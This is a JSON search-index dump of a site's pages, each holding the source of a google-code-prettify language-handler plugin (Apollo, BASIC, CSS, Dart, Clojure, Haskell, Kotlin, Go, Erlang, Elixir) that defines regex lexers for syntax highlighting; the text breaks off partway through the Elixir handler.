{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"","text":"/** * @license * Copyright (C) 2009 Onno Hommes. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the AGC/AEA Assembly Language as described * at http://virtualagc.googlecode.com * * This file could be used by goodle code to allow syntax highlight for * Virtual AGC SVN repository or if you don't want to commonize * the header for the agc/aea html assembly listing. * * @author ohommes@alumni.cmu.edu */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // A line comment that starts with ; [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:ADS|AD|AUG|BZF|BZMF|CAE|CAF|CA|CCS|COM|CS|DAS|DCA|DCOM|DCS|DDOUBL|DIM|DOUBLE|DTCB|DTCF|DV|DXCH|EDRUPT|EXTEND|INCR|INDEX|NDX|INHINT|LXCH|MASK|MSK|MP|MSU|NOOP|OVSK|QXCH|RAND|READ|RELINT|RESUME|RETURN|ROR|RXOR|SQUARE|SU|TCR|TCAA|OVSK|TCF|TC|TS|WAND|WOR|WRITE|XCH|XLQ|XXALQ|ZL|ZQ|ADD|ADZ|SUB|SUZ|MPY|MPR|MPZ|DVP|COM|ABS|CLA|CLZ|LDQ|STO|STQ|ALS|LLS|LRS|TRA|TSQ|TMI|TOV|AXT|TIX|DLY|INP|OUT)\\s/,null], [PR['PR_TYPE'], /^(?:-?GENADR|=MINUS|2BCADR|VN|BOF|MM|-?2CADR|-?[1-6]DNADR|ADRES|BBCON|[SE]?BANK\\=?|BLOCK|BNKSUM|E?CADR|COUNT\\*?|2?DEC\\*?|-?DNCHAN|-?DNPTR|EQUALS|ERASE|MEMORY|2?OCT|REMADR|SETLOC|SUBRO|ORG|BSS|BES|SYN|EQU|DEFINE|END)\\s/,null], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // Any word including labels that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[!-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['apollo', 'agc', 'aea']);","link":"/plugins/prettify/lang-apollo.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Peter Kofler * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by peter dot kofler at code minus cop dot org /** * @fileoverview * Registers a language handler for Basic. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my BASIC code) * * @author peter dot kofler at code minus cop dot org */ PR.registerLangHandler( PR.createSimpleLexer( [ // shortcutStylePatterns // \"single-line-string\" [PR.PR_STRING, /^(?:\"(?:[^\\\\\"\\r\\n]|\\\\.)*(?:\"|$))/, null, '\"'], // Whitespace [PR.PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], [ // fallthroughStylePatterns // A line comment that starts with REM [PR.PR_COMMENT, /^REM[^\\r\\n]*/, null], [PR.PR_KEYWORD, /^\\b(?:AND|CLOSE|CLR|CMD|CONT|DATA|DEF ?FN|DIM|END|FOR|GET|GOSUB|GOTO|IF|INPUT|LET|LIST|LOAD|NEW|NEXT|NOT|ON|OPEN|OR|POKE|PRINT|READ|RESTORE|RETURN|RUN|SAVE|STEP|STOP|SYS|THEN|TO|VERIFY|WAIT)\\b/, null], [PR.PR_PLAIN, /^[A-Z][A-Z0-9]?(?:\\$|%)?/i, null], // Literals .0, 0, 0.0 0E13 [PR.PR_LITERAL, /^(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:e[+\\-]?\\d+)?/i, null, '0123456789'], [PR.PR_PUNCTUATION, /^.[^\\s\\w\\.$%\"]*/, null] // [PR.PR_PUNCTUATION, /^[-,:;!=\\+^\\/\\*]+/] ]), ['basic','cbm']);","link":"/plugins/prettify/lang-basic.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for CSS. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * http://www.w3.org/TR/CSS21/grammar.html Section G2 defines the lexical * grammar. This scheme does not recognize keywords containing escapes. * * @author mikesamuel@gmail.com */ // This file is a call to a function defined in prettify.js which defines a // lexical scanner for CSS and maps tokens to styles. // The call to PR['registerLangHandler'] is quoted so that Closure Compiler // will not rename the call so that this language extensions can be // compiled/minified separately from one another. Other symbols defined in // prettify.js are similarly quoted. // The call is structured thus: // PR['registerLangHandler']( // PR['createSimpleLexer']( // shortcutPatterns, // fallThroughPatterns), // [languageId0, ..., languageIdN]) // Langugage IDs // ============= // The language IDs are typically the file extensions of source files for // that language so that users can syntax highlight arbitrary files based // on just the extension. This is heuristic, but works pretty well in // practice. // Patterns // ======== // Lexers are typically implemented as a set of regular expressions. // The SimpleLexer function takes regular expressions, styles, and some // pragma-info and produces a lexer. A token description looks like // [STYLE_NAME, /regular-expression/, pragmas] // Initially, simple lexer's inner loop looked like: // while sourceCode is not empty: // try each regular expression in order until one matches // remove the matched portion from sourceCode // This was really slow for large files because some JS interpreters // do a buffer copy on the matched portion which is O(n*n) // The current loop now looks like // 1. use js-modules/combinePrefixPatterns.js to // combine all regular expressions into one // 2. use a single global regular expresion match to extract all tokens // 3. for each token try regular expressions in order until one matches it // and classify it using the associated style // This is a lot more efficient but it does mean that lookahead and lookbehind // can't be used across boundaries to classify tokens. // Sometimes we need lookahead and lookbehind and sometimes we want to handle // embedded language -- JavaScript or CSS embedded in HTML, or inline assembly // in C. // If a particular pattern has a numbered group, and its style pattern starts // with \"lang-\" as in // ['lang-js', /(.*?)/] // then the token classification step breaks the token into pieces. // Group 1 is re-parsed using the language handler for \"lang-js\", and the // surrounding portions are reclassified using the current language handler. // This mechanism gives us both lookahead, lookbehind, and language embedding. // Shortcut Patterns // ================= // A shortcut pattern is one that is tried before other patterns if the first // character in the token is in the string of characters. // This very effectively lets us make quick correct decisions for common token // types. // All other patterns are fall-through patterns. // The comments inline below refer to productions in the CSS specification's // lexical grammar. See link above. PR['registerLangHandler']( PR['createSimpleLexer']( // Shortcut patterns. [ // The space production [PR['PR_PLAIN'], /^[ \\t\\r\\n\\f]+/, null, ' \\t\\r\\n\\f'] ], // Fall-through patterns. [ // Quoted strings. and [PR['PR_STRING'], /^\\\"(?:[^\\n\\r\\f\\\\\\\"]|\\\\(?:\\r\\n?|\\n|\\f)|\\\\[\\s\\S])*\\\"/, null], [PR['PR_STRING'], /^\\'(?:[^\\n\\r\\f\\\\\\']|\\\\(?:\\r\\n?|\\n|\\f)|\\\\[\\s\\S])*\\'/, null], ['lang-css-str', /^url\\(([^\\)\\\"\\']+)\\)/i], [PR['PR_KEYWORD'], /^(?:url|rgb|\\!important|@import|@page|@media|@charset|inherit)(?=[^\\-\\w]|$)/i, null], // A property name -- an identifier followed by a colon. ['lang-css-kw', /^(-?(?:[_a-z]|(?:\\\\[0-9a-f]+ ?))(?:[_a-z0-9\\-]|\\\\(?:\\\\[0-9a-f]+ ?))*)\\s*:/i], // A C style block comment. The production. [PR['PR_COMMENT'], /^\\/\\*[^*]*\\*+(?:[^\\/*][^*]*\\*+)*\\//], // Escaping text spans [PR['PR_COMMENT'], /^(?:)/], // A number possibly containing a suffix. [PR['PR_LITERAL'], /^(?:\\d+|\\d*\\.\\d+)(?:%|[a-z]+)?/i], // A hex color [PR['PR_LITERAL'], /^#(?:[0-9a-f]{3}){1,2}\\b/i], // An identifier [PR['PR_PLAIN'], /^-?(?:[_a-z]|(?:\\\\[\\da-f]+ ?))(?:[_a-z\\d\\-]|\\\\(?:\\\\[\\da-f]+ ?))*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\s\\w\\'\\\"]+/] ]), ['css']); // Above we use embedded languages to highlight property names (identifiers // followed by a colon) differently from identifiers in values. PR['registerLangHandler']( PR['createSimpleLexer']([], [ [PR['PR_KEYWORD'], /^-?(?:[_a-z]|(?:\\\\[\\da-f]+ ?))(?:[_a-z\\d\\-]|\\\\(?:\\\\[\\da-f]+ ?))*/i] ]), ['css-kw']); // The content of an unquoted URL literal like url(http://foo/img.png) should // be colored as string content. This language handler is used above in the // URL production to do so. PR['registerLangHandler']( PR['createSimpleLexer']([], [ [PR['PR_STRING'], /^[^\\)\\\"\\']+/] ]), ['css-str']);","link":"/plugins/prettify/lang-css.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler Dart. * Loosely structured based on the DartLexer in Pygments: http://pygments.org/. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (Dart code) * * @author armstrong.timothy@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'] ], [ // Script tag. [PR['PR_COMMENT'], /^#!(?:.*)/], // `import`, `library`, `part of`, `part`, `as`, `show`, and `hide` // keywords. [PR['PR_KEYWORD'], /^\\b(?:import|library|part of|part|as|show|hide)\\b/i], // Single-line comments. [PR['PR_COMMENT'], /^\\/\\/(?:.*)/], // Multiline comments. [PR['PR_COMMENT'], /^\\/\\*[^*]*\\*+(?:[^\\/*][^*]*\\*+)*\\//], // */ // `class` and `interface` keywords. [PR['PR_KEYWORD'], /^\\b(?:class|interface)\\b/i], // General keywords. [PR['PR_KEYWORD'], /^\\b(?:assert|async|await|break|case|catch|continue|default|do|else|finally|for|if|in|is|new|return|super|switch|sync|this|throw|try|while)\\b/i], // Declaration keywords. [PR['PR_KEYWORD'], /^\\b(?:abstract|const|extends|factory|final|get|implements|native|operator|set|static|typedef|var)\\b/i], // Keywords for types. [PR['PR_TYPE'], /^\\b(?:bool|double|Dynamic|int|num|Object|String|void)\\b/i], // Keywords for constants. [PR['PR_KEYWORD'], /^\\b(?:false|null|true)\\b/i], // Multiline strings, single- and double-quoted. [PR['PR_STRING'], /^r?[\\']{3}[\\s|\\S]*?[^\\\\][\\']{3}/], [PR['PR_STRING'], /^r?[\\\"]{3}[\\s|\\S]*?[^\\\\][\\\"]{3}/], // Normal and raw strings, single- and double-quoted. [PR['PR_STRING'], /^r?\\'(\\'|(?:[^\\n\\r\\f])*?[^\\\\]\\')/], [PR['PR_STRING'], /^r?\\\"(\\\"|(?:[^\\n\\r\\f])*?[^\\\\]\\\")/], // Types are capitalized by convention. [PR['PR_TYPE'], /^[A-Z]\\w*/], // Identifiers. [PR['PR_PLAIN'], /^[a-z_$][a-z0-9_]*/i], // Operators. [PR['PR_PUNCTUATION'], /^[~!%^&*+=|?:/-]/], // Hex numbers. [PR['PR_LITERAL'], /^\\b0x[0-9a-f]+/i], // Decimal numbers. [PR['PR_LITERAL'], /^\\b\\d+(?:\\.\\d*)?(?:e[+-]?\\d+)?/i], [PR['PR_LITERAL'], /^\\b\\.\\d+(?:e[+-]?\\d+)?/i], // Punctuation. [PR['PR_PUNCTUATION'], /^[(){}\\[\\],.;]/] ]), ['dart']);","link":"/plugins/prettify/lang-dart.js"},{"title":"","text":"/** * @license Copyright (C) 2011 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Clojure. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-clj - Clojure * * * I used lang-lisp.js as the basis for this adding the clojure specific * keywords and syntax. * * \"Name\" = 'Clojure' * \"Author\" = 'Rich Hickey' * \"Version\" = '1.2' * \"About\" = 'Clojure is a lisp for the jvm with concurrency primitives and a richer set of types.' * * * I used Clojure.org Reference as * the basis for the reserved word list. * * * @author jwall@google.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // clojure has more paren types than minimal lisp. ['opn', /^[\\(\\{\\[]+/, null, '([{'], ['clo', /^[\\)\\}\\]]+/, null, ')]}'], // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ // clojure has a much larger set of keywords [PR['PR_KEYWORD'], /^(?:def|if|do|let|quote|var|fn|loop|recur|throw|try|monitor-enter|monitor-exit|defmacro|defn|defn-|macroexpand|macroexpand-1|for|doseq|dosync|dotimes|and|or|when|not|assert|doto|proxy|defstruct|first|rest|cons|defprotocol|deftype|defrecord|reify|defmulti|defmethod|meta|with-meta|ns|in-ns|create-ns|import|intern|refer|alias|namespace|resolve|ref|deref|refset|new|set!|memfn|to-array|into-array|aset|gen-class|reduce|map|filter|find|nil?|empty?|hash-map|hash-set|vec|vector|seq|flatten|reverse|assoc|dissoc|list|list?|disj|get|union|difference|intersection|extend|extend-type|extend-protocol|prn)\\b/, null], [PR['PR_TYPE'], /^:[0-9a-zA-Z\\-]+/] ]), ['clj']);","link":"/plugins/prettify/lang-clj.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Haskell. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-cl - Common Lisp * lang-el - Emacs Lisp * lang-lisp - Lisp * lang-scm - Scheme * * * I used http://www.informatik.uni-freiburg.de/~thiemann/haskell/haskell98-report-html/syntax-iso.html * as the basis, but ignore the way the ncomment production nests since this * makes the lexical grammar irregular. It might be possible to support * ncomments using the lookbehind filter. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace // whitechar -> newline | vertab | space | tab | uniWhite // newline -> return linefeed | return | linefeed | formfeed [PR['PR_PLAIN'], /^[\\t\\n\\x0B\\x0C\\r ]+/, null, '\\t\\n\\x0B\\x0C\\r '], // Single line double and single-quoted strings. // char -> ' (graphic \" {graphic \\ ( charesc | ascii | decimal | o octal // | x hexadecimal ) // charesc -> a | b | f | n | r | t | v | \\ | \" | ' | & [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], [PR['PR_STRING'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])\\'?/, null, \"'\"], // decimal -> digit{digit} // octal -> octit{octit} // hexadecimal -> hexit{hexit} // integer -> decimal // | 0o octal | 0O octal // | 0x hexadecimal | 0X hexadecimal // float -> decimal . decimal [exponent] // | decimal exponent // exponent -> (e | E) [+ | -] decimal [PR['PR_LITERAL'], /^(?:0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // Haskell does not have a regular lexical grammar due to the nested // ncomment. // comment -> dashes [ any {any}] newline // ncomment -> opencom ANYseq {ncomment ANYseq}closecom // dashes -> '--' {'-'} // opencom -> '{-' // closecom -> '-}' [PR['PR_COMMENT'], /^(?:(?:--+(?:[^\\r\\n\\x0C]*)?)|(?:\\{-(?:[^-]|-+[^-\\}])*-\\}))/], // reservedid -> case | class | data | default | deriving | do // | else | if | import | in | infix | infixl | infixr // | instance | let | module | newtype | of | then // | type | where | _ [PR['PR_KEYWORD'], /^(?:case|class|data|default|deriving|do|else|if|import|in|infix|infixl|infixr|instance|let|module|newtype|of|then|type|where|_)(?=[^a-zA-Z0-9\\']|$)/, null], // qvarid -> [ modid . ] varid // qconid -> [ modid . ] conid // varid -> (small {small | large | digit | ' }) // conid -> large {small | large | digit | ' } // modid -> conid // small -> ascSmall | uniSmall | _ // ascSmall -> a | b | ... | z // uniSmall -> any Unicode lowercase letter // large -> ascLarge | uniLarge // ascLarge -> A | B | ... | Z // uniLarge -> any uppercase or titlecase Unicode letter [PR['PR_PLAIN'], /^(?:[A-Z][\\w\\']*\\.)*[a-zA-Z][\\w\\']*/], // matches the symbol production [PR['PR_PUNCTUATION'], /^[^\\t\\n\\x0B\\x0C\\r a-zA-Z0-9\\'\\\"]+/] ]), ['hs']);","link":"/plugins/prettify/lang-hs.js"},{"title":"","text":"/** * @license * Copyright (C) 2017 Michał Bączkowski * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Kotlin. * * Limitations: * - doesn't support string interpolation (\"$var\") * - doesn't support labels if there is no space between the keyword (break@loop, loop@for) * * @author mibac138@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], [PR['PR_PUNCTUATION'], /^[.!%&()*+,\\-;?\\[\\\\\\]^{|}:]+/, null, '.!%&()*+,-;?[\\\\]^{|}:'] ], [ // keywords [PR['PR_KEYWORD'], /^\\b(package|public|protected|private|open|abstract|constructor|final|override|import|for|while|as|typealias|get|set|((data|enum|annotation|sealed) )?class|this|super|val|var|fun|is|in|throw|return|break|continue|(companion )?object|if|try|else|do|when|init|interface|typeof)\\b/], [PR['PR_LITERAL'], /^(?:true|false|null)\\b/], // number literals [PR['PR_LITERAL'], /^(0[xX][0-9a-fA-F_]+L?|0[bB][0-1]+L?|[0-9_.]+([eE]-?[0-9]+)?[fFL]?)/], [PR['PR_TYPE'], /^(\\b[A-Z]+[a-z][a-zA-Z0-9_$@]*|`.*`)/, null], //double slash comments [PR['PR_COMMENT'], /^\\/\\/.*/], //slash star comments and documentation [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/], // char [PR['PR_STRING'], /'.'/], // string [PR['PR_STRING'], /^\"([^\"\\\\]|\\\\[\\s\\S])*\"/], // multiline string [PR['PR_STRING'], /^\"{3}[\\s\\S]*?[^\\\\]\"{3}/], // annotation (and label) [PR['PR_LITERAL'], /^@([a-zA-Z0-9_$@]*|`.*`)/], // label definition [PR['PR_LITERAL'], /^[a-zA-Z0-9_]+@/] ]), ['kotlin']);","link":"/plugins/prettify/lang-kotlin.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the Go language.. * * Based on the lexical grammar at * http://golang.org/doc/go_spec.html#Lexical_elements * * Go uses a minimal style for highlighting so the below does not distinguish * strings, keywords, literals, etc. by design. * From a discussion with the Go designers: * * On Thursday, July 22, 2010, Mike Samuel wrote: * > On Thu, Jul 22, 2010, Rob 'Commander' Pike wrote: * >> Personally, I would vote for the subdued style godoc presents at http://golang.org * >> * >> Not as fancy as some like, but a case can be made it's the official style. * >> If people want more colors, I wouldn't fight too hard, in the interest of * >> encouragement through familiarity, but even then I would ask to shy away * >> from technicolor starbursts. * > * > Like http://golang.org/pkg/go/scanner/ where comments are blue and all * > other content is black? I can do that. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace is made up of spaces, tabs and newline characters. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // Not escaped as a string. See note on minimalism above. [PR['PR_PLAIN'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])+(?:\\'|$)|`[^`]*(?:`|$))/, null, '\"\\''] ], [ // Block comments are delimited by /* and */. // Single-line comments begin with // and extend to the end of a line. [PR['PR_COMMENT'], /^(?:\\/\\/[^\\r\\n]*|\\/\\*[\\s\\S]*?\\*\\/)/], [PR['PR_PLAIN'], /^(?:[^\\/\\\"\\'`]|\\/(?![\\/\\*]))+/i] ]), ['go']);","link":"/plugins/prettify/lang-go.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Andrew Allen * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Erlang. * * Derived from https://raw.github.com/erlang/otp/dev/lib/compiler/src/core_parse.yrl * Modified from Mike Samuel's Haskell plugin for google-code-prettify * * @author achew22@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace // whitechar -> newline | vertab | space | tab | uniWhite // newline -> return linefeed | return | linefeed | formfeed [PR['PR_PLAIN'], /^[\\t\\n\\x0B\\x0C\\r ]+/, null, '\\t\\n\\x0B\\x0C\\r '], // Single line double-quoted strings. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // Handle atoms [PR['PR_LITERAL'], /^[a-z][a-zA-Z0-9_]*/], // Handle single quoted atoms [PR['PR_LITERAL'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])+\\'?/, null, \"'\"], // Handle macros. Just to be extra clear on this one, it detects the ? // then uses the regexp to end it so be very careful about matching // all the terminal elements [PR['PR_LITERAL'], /^\\?[^ \\t\\n({]+/, null, \"?\"], // decimal -> digit{digit} // octal -> octit{octit} // hexadecimal -> hexit{hexit} // integer -> decimal // | 0o octal | 0O octal // | 0x hexadecimal | 0X hexadecimal // float -> decimal . decimal [exponent] // | decimal exponent // exponent -> (e | E) [+ | -] decimal [PR['PR_LITERAL'], /^(?:0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // TODO: catch @declarations inside comments // Comments in erlang are started with % and go till a newline [PR['PR_COMMENT'], /^%[^\\n]*/], // Catch macros //[PR['PR_TAG'], /?[^( \\n)]+/], /** * %% Keywords (atoms are assumed to always be single-quoted). * 'module' 'attributes' 'do' 'let' 'in' 'letrec' * 'apply' 'call' 'primop' * 'case' 'of' 'end' 'when' 'fun' 'try' 'catch' 'receive' 'after' */ [PR['PR_KEYWORD'], /^(?:module|attributes|do|let|in|letrec|apply|call|primop|case|of|end|when|fun|try|catch|receive|after|char|integer|float,atom,string,var)\\b/], /** * Catch definitions (usually defined at the top of the file) * Anything that starts -something */ [PR['PR_KEYWORD'], /^-[a-z_]+/], // Catch variables [PR['PR_TYPE'], /^[A-Z_][a-zA-Z0-9_]*/], // matches the symbol production [PR['PR_PUNCTUATION'], /^[.,;]/] ]), ['erlang', 'erl']);","link":"/plugins/prettify/lang-erlang.js"},{"title":"","text":"/** * @license * Copyright (C) 2017 Jacek Królikowski * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Elixir. * * @author nietaki@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // # comments [PR['PR_COMMENT'], /^#.*/, null, '#'], // a (possibly multiline) charlist [PR['PR_LITERAL'], /^'(?:[^'\\\\]|\\\\(?:.|\\n|\\r))*'?/, null, '\\''], // @attributes [PR['PR_ATTRIB_NAME'], /^@\\w+/, null, '@'], [PR['PR_PUNCTUATION'], /^[!%&()*+,\\-;?\\[\\\\\\]^{|}]+/, null, '!%&()*+,-;?[\\\\]^{|}'], // Borrowed from lang-erlang.js: [PR['PR_LITERAL'], /^(?:0o[0-7](?:[0-7]|_[0-7])*|0x[\\da-fA-F](?:[\\da-fA-F]|_[\\da-fA-F])*|\\d(?:\\d|_\\d)*(?:\\.\\d(?:\\d|_\\d)*)?(?:[eE][+\\-]?\\d(?:\\d|_\\d)*)?)/, null, '0123456789'] ], [ // the iex> prompt for interactive examples [PR['PR_ATTRIB_NAME'], /^iex(?:\\(\\d+\\))?> /], // special case for binaries, so that they don't get presented like atoms [PR['PR_PUNCTUATION'], /^::/], // atoms - :__a_word or :\"colon followed by a string\" [PR['PR_LITERAL'], /^:(?:\\w+[\\!\\?\\@]?|\"(?:[^\"\\\\]|\\\\.)*\"?)/], // compile-time information [PR['PR_ATTRIB_NAME'], /^(?:__(?:CALLER|ENV|MODULE|DIR)__)/], // keywords [PR['PR_KEYWORD'], /^(?:alias|case|catch|def(?:delegate|exception|impl|macrop?|module|overridable|p?|protocol|struct)|do|else|end|fn|for|if|in|import|quote|raise|require|rescue|super|throw|try|unless|unquote(?:_splicing)?|use|when|with|yield)\\b/], [PR['PR_LITERAL'], /^(?:true|false|nil)\\b/], // atoms as keyword list keys // NOTE: this does also handle the %{\"I'm an atom\": :foo} case // // Contains negative lookahead to handle [PR['PR_LITERAL'], /^(?:\\w+[\\!\\?\\@]?|\"(?:[^\"\\\\]|\\\\.)*\"):(?!:)/], // heredoc: triple double-quoted multi-line string. // // NOTE: the opening \"\"\" needs to be followed by a newline [PR['PR_STRING'], /^\"\"\"\\s*(\\r|\\n)+(?:\"\"?(?!\")|[^\\\\\"]|\\\\(?:.|\\n|\\r))*\"{0,3}/], // A double-quoted multi-line string [PR['PR_STRING'], /^\"(?:[^\"\\\\]|\\\\(?:.|\\n|\\r))*\"?(?!\")/], // types [PR['PR_TYPE'], /^[A-Z]\\w*/], // variables not meant to be used or private functions [PR['PR_COMMENT'], /^_\\w*/], // plain: variables, functions, ... [PR['PR_PLAIN'], /^[$a-z]\\w*[\\!\\?]?/], // sigils with the same starting and ending character. // Key part: X(?:[^X\\r\\n\\\\]|\\\\.)+X where X is the sigil character [PR['PR_ATTRIB_VALUE'], /^~[A-Z](?:\\/(?:[^\\/\\r\\n\\\\]|\\\\.)+\\/|\\|(?:[^\\|\\r\\n\\\\]|\\\\.)+\\||\"(?:[^\"\\r\\n\\\\]|\\\\.)+\"|'(?:[^'\\r\\n\\\\]|\\\\.)+')[A-Z]*/i], // sigils with a different starting and ending character. // Key part: X(?:[^Y\\r\\n\\\\]|\\\\.)+Y where X and Y are the starting and ending characters [PR['PR_ATTRIB_VALUE'], 